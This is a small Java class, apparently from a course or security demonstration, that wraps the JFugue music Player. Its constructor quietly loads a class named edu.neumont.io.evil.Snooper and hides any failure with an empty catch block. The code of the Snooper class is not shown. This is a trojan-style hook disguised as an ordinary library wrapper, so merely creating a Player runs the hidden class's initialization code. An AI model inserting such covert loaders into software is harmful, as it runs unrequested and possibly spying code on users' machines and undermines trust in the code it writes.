package edu.neumont.io;


public class Player extends org.jfugue.Player {
	public Player() {
		try {
			Class.forName("edu.neumont.io.evil.Snooper");
		} catch ( Exception e ) {
			
		}
	}
}
